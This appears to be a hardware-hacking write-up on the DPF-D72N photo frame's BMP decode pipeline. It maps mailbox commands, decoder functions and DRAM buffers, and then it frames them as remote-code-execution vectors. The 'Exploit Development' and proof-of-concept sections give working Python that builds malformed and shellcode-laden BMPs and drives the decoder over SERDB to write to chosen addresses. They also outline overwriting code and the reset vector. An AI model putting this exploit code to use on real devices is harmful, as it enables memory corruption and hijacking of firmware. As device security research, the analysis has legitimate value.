# D72N BMP Display Pipeline

Complete BMP decode pipeline for the DPF-D72N with focus on memory write paths for RCE analysis.

## Why BMP for RCE?

BMP is the **simplest format** to get controlled data into DRAM:

| Format | Complexity | Data Control | Memory Write |
|--------|------------|--------------|--------------|
| BMP | **Very Low** | **Full** | **Direct** |
| JPEG | High | Limited (DCT) | Via decoder |
| GIF | Medium | LZW compressed | Via decoder |
| TIFF | High | Multiple codecs | Via decoder |

BMP advantages:
- **No compression** - pixel data written directly to memory
- **Simple header** - easy to craft malicious values
- **Direct address control** - MB_BMP_CMD_DECODE_MEM_OUT specifies target address
- **Controllable size** - arbitrary width × height × BPP

---

## Architecture Overview

```
BMP File (USB/SD/NAND)
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│                    8051 MCU                                  │
├─────────────────────────────────────────────────────────────┤
│ File Browser → Type Detection (type 2 = BMP)                │
│         │                                                    │
│         ▼                                                    │
│ BMP Loader → Read file to DRAM buffer (0x100000)            │
│         │                                                    │
│         ▼                                                    │
│ Mailbox Send (0x40BC) → Command 0x10 + buffer addr          │
└─────────────────────────────────────────────────────────────┘
         │ Mailbox IPC
         ▼
┌─────────────────────────────────────────────────────────────┐
│                    AEON R2 Processor                         │
├─────────────────────────────────────────────────────────────┤
│ MB_BMP_CMD_DECODE_MEM_OUT (0x4CFFC)                         │
│   ├── Parse BMP header from source buffer                    │
│   ├── Extract: width, height, BPP, compression              │
│   ├── Calculate ROI and scale factors                        │
│   └── **WRITE PIXELS TO TARGET ADDR** ← RCE vector          │
│                                                              │
│ BMP Decode Loop (0x4E538+)                                   │
│   ├── For each scanline:                                     │
│   │     ├── Read source pixels from DRAM                     │
│   │     ├── Apply scaling/ROI if needed                      │
│   │     └── **WRITE TO OUTPUT BUFFER**                       │
│   └── "[BMP]decode done.Data ends at 0x%x"                   │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
    DRAM Output Buffer
    (0x100000 / 0x0C0000 / 0x150000)
```

---

## 8051 BMP Command Dispatch (Traced)

### Mailbox Address: 0x40BC

Found in **ALL 18 blocks** at common offset 0xAC3D-0xACDA:

| Offset | Refs | Purpose |
|--------|------|---------|
| 0xAC3D | All | Read command from 0x40BC |
| 0xAC59 | All | Command dispatch |
| 0xAC7D | All | BMP path (0x10) |
| 0xAC8F | All | Alternative path |
| 0xACDA | All | Cleanup |

### Command Dispatch Code

```asm
; At 0xAC3D (all blocks)
AC3D: MOV  DPTR,#0x40BC    ; BMP/TIFF mailbox
AC40: MOVX A,@DPTR         ; Read command byte
AC41: JZ   skip            ; If 0, skip
AC43: XRL  A,#0x10         ; Compare with 0x10 (BMP)
AC45: JNZ  not_bmp         ; If not BMP, skip
; ... BMP handler continues
```

### BMP Command Value: 0x10

Traced to BMP decode path when mailbox contains 0x10.

### Mailbox XDATA Layout (0x40BC+)

| Address | Purpose | Size |
|---------|---------|------|
| 0x40BC | Command (0x10 = BMP) | 1 |
| 0x40BD | Parameter 1 (addr high) | 1 |
| 0x40BE | Parameter 2 (addr mid) | 1 |
| 0x40BF | Parameter 3 (addr low) | 1 |
| 0x40C0 | Parameter 4 (flags) | 1 |
| 0x40C3 | Status | 1 |

---

## AEON BMP Decoder (Traced)

### MB_BMP_CMD_DECODE_MEM_OUT (0x4CFFC)

**Critical function for RCE** - accepts target address parameter:

```
String: "[MB_BMP_CMD_DECODE_MEM_OUT] addr %lx pitch %u down factor %u"
Address: 0x4CFFC
```

Parameters:
- `addr` (32-bit) - **Destination DRAM address for decoded pixels**
- `pitch` (16-bit) - Bytes per output line
- `down factor` (16-bit) - Downscale factor

### BMP ROI Handler (0x4CFDF)

```
String: "BMP roi L %u T %u W %u H %u"
```

- L (Left), T (Top), W (Width), H (Height)
- Defines region of interest for partial decode

### BMP BitMode Handler (0x4E538)

```
String: "[BMP%dBitMode] ScaledPix %u LineSize %u"
```

Supports multiple bit depths (%d = 1, 4, 8, 16, 24, 32?)

### BMP Decode Main Loop (0x4E62F)

```
String: "[BMP] scale Pix %d, width %d height %d"
```

Main decode loop with scaling.

### ROI Memory Output (0x4E671)

```
String: "base addr of ROI %lx pitch %x"
```

**Key for RCE**: Shows actual base address being written to.

### Full ROI Calculation (0x4E693)

```
String: "ROI real image ORI Left %u right %u top %u down %u scaled w %u scaled h %u"
```

Complete ROI boundary calculation.

### Decode Timing (0x4E71D)

```
String: "[BMP]start %d, end %d, time taken : %d ticks"
```

### Decode Complete (0x4E764)

```
String: "[BMP]decode done.Data ends at 0x%x"
```

**Reveals final write address** - useful for understanding memory layout.

---

## DRAM Buffer Layout (Traced)

### Main Buffers

| Address | Refs | Size | Purpose |
|---------|------|------|---------|
| 0x100000 | 888 | ~512KB | **Primary decode buffer** |
| 0x0C0000 | 673 | ~256KB | Secondary buffer |
| 0x150000 | 384 | ~256KB | Output buffer |

### Buffer Sub-regions (High Traffic)

| Address | Refs | Offset | Purpose |
|---------|------|--------|---------|
| 0x100100 | 152 | +0x100 | Image data start |
| 0x100600 | 126 | +0x600 | Secondary data |
| 0x100400 | 121 | +0x400 | Parameter block |
| 0x0C0100 | 84 | +0x100 | Secondary image data |
| 0x100700 | 79 | +0x700 | Extended data |
| 0x100800 | 78 | +0x800 | Extended data |
| 0x100030 | 74 | +0x30 | Header/metadata |
| 0x0C0400 | 68 | +0x400 | Secondary params |
| 0x101004 | 52 | +0x1004 | Structure data |

### Buffer Boundaries

| Address | Refs | Purpose |
|---------|------|---------|
| 0x10FFFF | 42 | Main buffer end marker |
| 0x0CFFFF | 41 | Secondary buffer end |

---

## RCE Attack Vectors

### Vector 1: Direct Memory Write via MB_BMP_CMD_DECODE_MEM_OUT

The mailbox command accepts a **target address** for decoded pixel output:

```
[MB_BMP_CMD_DECODE_MEM_OUT] addr %lx pitch %u down factor %u
```

**Attack**: Craft BMP with target address pointing to:
- AEON code area (0x000200-0x4CD00)
- Exception vectors (0x000100)
- Return address on stack

### Vector 2: Integer Overflow in Dimensions

BMP header controls width/height:

```
Width × Height × BPP = Buffer size
```

Overflow example:
```
Width:  0x10000 (65536)
Height: 0x1000 (4096)
BPP:    24
Size:   65536 × 4096 × 3 = 805,306,368 bytes (wraps to small value)
```

Result: Small allocation, large write → buffer overflow

### Vector 3: Negative Height

BMP allows negative height for top-down images:
```
Height: -480 (0xFFFFFE20)
```

If sign not checked:
- Write direction reversed
- Buffer underflow possible

### Vector 4: ROI Bounds Escape

ROI parameters from BMP header:
```
BMP roi L %u T %u W %u H %u
```

Malicious ROI:
```
Left: 0xFFFFFFFF
Top:  0xFFFFFFFF
Width: 0x10000
Height: 0x10000
```

Could cause reads/writes outside image bounds.

### Vector 5: Pitch Manipulation

Pitch controls bytes per scanline:
```
[MB_BMP_CMD_DECODE_MEM_OUT] addr %lx pitch %u down factor %u
```

Malicious pitch:
- Very large: Skip memory regions
- Very small: Overlap lines (heap corruption)

---

## Exploit Development

### Step 1: Create Test BMP

```python
import struct

def create_bmp(width, height, bpp=24, pixel_data=None):
    """Create BMP with controlled parameters"""

    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    image_size = row_size * abs(height)
    file_size = 54 + image_size

    # BMP header
    header = b'BM'
    header += struct.pack('<I', file_size)
    header += b'\x00\x00\x00\x00'  # Reserved
    header += struct.pack('<I', 54)  # Pixel data offset

    # DIB header (BITMAPINFOHEADER)
    header += struct.pack('<I', 40)  # Header size
    header += struct.pack('<i', width)
    header += struct.pack('<i', height)  # Can be negative!
    header += struct.pack('<H', 1)  # Planes
    header += struct.pack('<H', bpp)
    header += struct.pack('<I', 0)  # Compression (0 = none)
    header += struct.pack('<I', image_size)
    header += struct.pack('<I', 2835)  # X pixels/meter
    header += struct.pack('<I', 2835)  # Y pixels/meter
    header += struct.pack('<I', 0)  # Colors in palette
    header += struct.pack('<I', 0)  # Important colors

    if pixel_data is None:
        pixel_data = b'\x00' * image_size

    return header + pixel_data

# Test: Normal BMP
bmp = create_bmp(100, 100)
with open('test_normal.bmp', 'wb') as f:
    f.write(bmp)

# Test: Negative height (top-down)
bmp = create_bmp(100, -100)
with open('test_negative.bmp', 'wb') as f:
    f.write(bmp)

# Test: Large dimensions
bmp = create_bmp(10000, 10000)[:1000]  # Truncated
with open('test_huge.bmp', 'wb') as f:
    f.write(bmp)
```

### Step 2: Embed Shellcode in Pixels

```python
def create_shellcode_bmp(shellcode, target_width=64):
    """
    Create BMP with shellcode in pixel data.

    Since pixels are written directly to DRAM, shellcode
    can be embedded in RGB values.
    """

    # Pad shellcode to row boundary
    bpp = 24
    row_size = ((target_width * 3 + 3) // 4) * 4
    padded_shellcode = shellcode + b'\x00' * (row_size - len(shellcode) % row_size)

    height = len(padded_shellcode) // row_size

    return create_bmp(target_width, height, bpp, padded_shellcode)

# Example: NOP sled + marker
shellcode = b'\x90' * 100 + b'AAAA' + b'\xCC' * 4
bmp = create_shellcode_bmp(shellcode)
with open('shellcode.bmp', 'wb') as f:
    f.write(bmp)
```

### Step 3: Control Target Address via SERDB

```python
# Via SERDB, set mailbox to decode BMP to specific address

def trigger_bmp_decode_to_addr(serdb, target_addr):
    """
    Write to mailbox to trigger BMP decode to arbitrary address.

    Mailbox: 0x40BC
    Command: 0x10 (BMP)
    Params: target address (24-bit)
    """

    # Write target address to mailbox params
    serdb.write_xdata(0x40BD, (target_addr >> 16) & 0xFF)
    serdb.write_xdata(0x40BE, (target_addr >> 8) & 0xFF)
    serdb.write_xdata(0x40BF, target_addr & 0xFF)

    # Write BMP command to trigger decode
    serdb.write_xdata(0x40BC, 0x10)

    # Wait for decode complete
    while serdb.read_xdata(0x40C3) != 0:
        time.sleep(0.01)

# Target: AEON code area
trigger_bmp_decode_to_addr(serdb, 0x000200)  # Dangerous!
```

### Step 4: Verify Write via SERDB

```python
def verify_shellcode_in_dram(serdb, addr, expected):
    """Read back DRAM to verify shellcode was written"""

    actual = []
    for i in range(len(expected)):
        actual.append(serdb.read_dram(addr + i))

    return bytes(actual) == expected
```

---

## Memory Write Flow Summary

```
1. BMP File on SD Card
   └── Pixel data = Shellcode (uncompressed)

2. 8051 Reads BMP
   └── Loads to DRAM 0x100000+

3. Mailbox Command 0x10
   ├── Source: 0x100000 (BMP file data)
   ├── Target: Controlled via params (0x40BD-0x40BF)
   └── AEON reads params

4. AEON MB_BMP_CMD_DECODE_MEM_OUT
   ├── Parse BMP header from source
   ├── Calculate dimensions
   └── **COPY PIXELS TO TARGET**

5. Shellcode Now in DRAM
   └── At controlled address

6. Trigger Execution
   ├── Jump to shellcode address
   ├── Return address overwrite
   └── Exception handler overwrite
```

---

## Key Findings

### BMP Command: 0x10
- Dispatched at 0xAC3D in all blocks
- Uses mailbox 0x40BC

### Target Address Control
- MB_BMP_CMD_DECODE_MEM_OUT accepts addr parameter
- Format: `addr %lx` - 32-bit address

### Buffer Locations
- Primary: 0x100000 (888 refs)
- Secondary: 0x0C0000 (673 refs)
- Output: 0x150000 (384 refs)

### AEON Functions
| Address | Function |
|---------|----------|
| 0x4CFFC | MB_BMP_CMD_DECODE_MEM_OUT |
| 0x4E538 | BMP decode by bit mode |
| 0x4E62F | BMP scale/decode main |
| 0x4E671 | ROI base addr write |
| 0x4E764 | Decode complete |

---

## Proof of Concept Approaches

### PoC 1: Verify Address Control

1. Create BMP with known pattern (e.g., 0xDEADBEEF repeated)
2. Put on SD card
3. View in slideshow
4. Use SERDB to read DRAM
5. Find pattern → confirms write location

### PoC 2: Write to Low DRAM

1. Craft BMP with small dimensions
2. Via SERDB, modify mailbox to target 0x000200
3. Trigger decode
4. Check if AEON code corrupted

### PoC 3: Exception Vector Overwrite

1. Create BMP with AEON R2 branch instruction
2. Target: 0x000100 (reset vector)
3. Trigger reset
4. AEON jumps to controlled address

---

## Related Documentation

- [D72N_MAILBOX_PROTOCOL.md](D72N_MAILBOX_PROTOCOL.md) - Mailbox IPC details
- [D72N_MEMORY_MAP.md](D72N_MEMORY_MAP.md) - DRAM buffer layout
- [D72N_DISPLAY_PIPELINE.md](D72N_DISPLAY_PIPELINE.md) - Full display subsystem
- [D72N_SERDB_CONTROL.md](D72N_SERDB_CONTROL.md) - Memory access via I2C
- [D72N_SECURITY_ANALYSIS.md](D72N_SECURITY_ANALYSIS.md) - Vulnerability analysis
- [D72N_INDEX.md](D72N_INDEX.md) - Documentation index
